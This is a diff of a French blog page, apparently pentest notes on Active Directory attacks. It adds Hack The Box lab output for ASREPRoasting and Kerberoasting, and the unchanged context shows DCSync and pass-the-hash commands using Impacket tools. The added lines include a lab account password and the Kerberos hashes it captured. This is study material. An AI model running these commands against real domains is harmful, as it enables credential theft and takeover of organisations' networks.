@@ -49,7 +49,7 @@ Récupération des informations pour construire la BDD
 
 
 
-<link rel="stylesheet" href="/scss/hyde-hyde.2aa50c1cef9d4c1452dcd5fdae0f04b8af0b434ba4411ac5045b3b0fb71da69a.css" integrity="sha256-KqUMHO&#43;dTBRS3NX9rg8EuK8LQ0ukQRrFBFs7D7cdppo=">
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
 
 
 <link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
@@ -241,7 +241,7 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
     
     
     <br/>
-    <i class="fas fa-clock"></i> 2 min read
+    <i class="fas fa-clock"></i> 3 min read
 </div>
 
 
@@ -291,15 +291,46 @@ total 108
 <h1 id="asreproasting">ASREPRoasting</h1>
 <p>Lorsque la pré-authentification n&rsquo;est pas activée on peut demander sans authentification au KDC (Key Distribution Center) du domaine de vérifier l&rsquo;identité (AS-REQ) pour qu&rsquo;il nous retourne le TGT (Ticket Granting Ticket) pour un user. Il nous retournera le  NTLM hash du compte correspondant. On peut faire cette demande avec Impacket</p>
 <pre><code class="language-"shell" data-lang=""shell">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py  &lt;domain name&gt;/ -usersfile &lt;fichier utilisateur&gt; -format &lt;john | hashcat&gt; -dc-ip &lt;ip&gt;
-</code></pre><h1 id="dcsync-attack">DCSync Attack</h1>
+</code></pre><p>Interroger tous les utilisateurs</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>root__kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
+Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN<span style="color:#f92672">=</span>Service Accounts,OU<span style="color:#f92672">=</span>Security Groups,DC<span style="color:#f92672">=</span>htb,DC<span style="color:#f92672">=</span>local  2021-11-10 17:11:18.682065  2021-11-10 17:10:28.400890  0x410200 
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:f27a05879e6d8eb8bda77ecf4e76dd69$6f8e4a3e010d59de643d30fd112c2d2ee6d119582a832593ce4b4b49391fd75c5ab9e31e9c71ee908620e609ff77e6c8b23501219100e686c13868b87b5f778a5c976444068717c14795922ff4948d45602c06caf8d5fcc86e6aef7cf089ebad39f3058a498dd96178c34481165b989b3a32d371d3343de161f6fb1e0a667d07fad692d80ed17e992e4af0d28db36646825c6d147da931f1447b5dad2a7dcdd603c59e228b1510d5d385d73c8a7423364a17e2f6a511ec8f4cf1fc7385725f64f22712e7b7b4e7564d61b43d79b90a35dfdcd7442c35ec8a8261c8de201901ffbce2b2b16d55
+
+</code></pre></div><h1 id="dcsync-attack">DCSync Attack</h1>
 <p>C&rsquo;est une attaque permettant de récupérer tous les hash des users de l&rsquo;active directory. Pour cela il faut avoir un compte qui a les droits <code>Replicating Directory Changes All</code> et <code>Replicating Directory Changes</code>. On peut coupler cette attaque avec un pass the hash.</p>
 <p>On peut effectuer cette attaque avec le module impacket et de le scrypt <code>secretsdump.py</code>.</p>
-<pre><code class="language-"shell" data-lang=""shell">python3 secretsdump.py  &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;
-</code></pre><h1 id="pass-the-hash">Pass the Hash</h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 secretsdump.py  &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;
+</code></pre></div><h1 id="pass-the-hash">Pass the Hash</h1>
 <p>On peut utiliser cette technique pour s&rsquo;authentifier juste avec le hash d&rsquo;un mot de passe. C&rsquo;est une faille présente dans le protocole d&rsquo;authentification NTLM.</p>
 <p>Il est possible de faire cette attaque avec un outil du moducle impacket <code>pssexec.py</code></p>
 <pre><code class="language-"shell" data-lang=""shell">psexec.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -hashes &lt;hash&gt;
-</code></pre>
+</code></pre><h1 id="kerberoasting">Kerberoasting</h1>
+<p>Lorsqu&rsquo;on obtient un compte valide au sein d&rsquo;un AD il est possible de demander pour tous les comptes possèdant un SPN (donc un potentiel service) son TGS.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request     
+Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
+                                                                                               
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN<span style="color:#f92672">=</span>Group Policy Creator Owners,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb  2018-07-18 19:06:40.351723  2021-01-21 16:07:03.723783                                                         
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f2dccc04f331ccc97a868a8afe89d1e4$6dff3bd16404c459ce13e20ba92171fc5b702c81433409ccae05f07161db3ea7878625428ccbc315f0d8e47e6b6fb
+23616aadb8178bdd80454dd21f0913f4aee8a42563013e1bdfdf5ed7ad67fd720729a65d2f11435d11edb0e8d79a95ae596bfd1b0955173f5d86cf4cbd8be31d29030e26af9f1f2bb8fad633974ec9d510980731102900c26c619a1bf376df
+5efa5207a0059aaef6dce26ae1aff3e729ef3e12566d420f657b64764f70fb7a4486104a7e69ec42219c4d8e99ec02686ae28a99f126074d4e84db34834d349b72f4a62e301681b2ca290d5ee8288ac9788204be5a7a4f34eb2b1fbc1d058d
+2ad784dc0eb3d71b1582967a31219dcc5aecfc48f0ae13dcd38862760c02b8b76120862f911a5ea2dd51ac0535ecf44acfbb03dfa941c097b030ab52a8aa21e889436fda5e027095a3af29552b602eb8cf0896910d183c906f4497ceaadb76
+94b903f70b930076ad39b8893c190eff5c78301fe1cdf04c2542aa661aef43c4ab00f63826829c569e93f93193d6223051dfb890bc3a3ac8e704b9d145e05b0ebc03c63b5853cab7ffc279dcefd0452be5b61b12408c66ef9e0fa12697ff1c
+cb18f1060b411fdc018f0ef07466c3643e729184897acc391b976c8f0641d76ee3c09f50fd1606854987ba07c35b9809fe797e3ed76e6b896d0c8ac889a81210ae70d2fc28e5cf41b934e8da62b22555a22b8ca0d89a3962ce74796e7fa658
+6cf5a6bcdedcabf1a649cb8dfdc71df50e475cf3df4aa4e1ee1f28698a7690c24a85e6d37e5435ea8f628b3782b39ec156a173f5008183910bcb1420f73e12405afcaf7a5a9aad6f863b58d9e2c1f4d06746cba054c1634a1c240a3a5b0f60
+773c842cb95b9d30f4f6474a59524990895d3605200ba9ba12f6eb5e5098a088bc7d9e4d79aae2f60edebc508214052e875eb12ee80b091b1d18f747999e6931824b7bb64073bcc7181edd16b9305f48efa40031c89eb5bbbcdd5d7d7a5e9a
+562db2831b787dfbdcc736b16a04d3f5232136a65cc3a3d84fda819e13ccf4d39680fe3f15076a8263f8c68da6afbf96c9dc3441380b00b4af886acd26a809277f9de6276f6cad5c0adc71582f1d260615f500b244f77d8e5821558fd0db8f
+077bfdda649b8f8e8b235317cc9afe71b269652dc6ca952d687bd38c7b96a08b3942d3ecd685490775a19dd226ab3033b4acde182c2840884e78ee359c950fe56fb7c910014d3206e545fef7ed14488bb8dd99b
+</code></pre></div>
   </div>
   
 
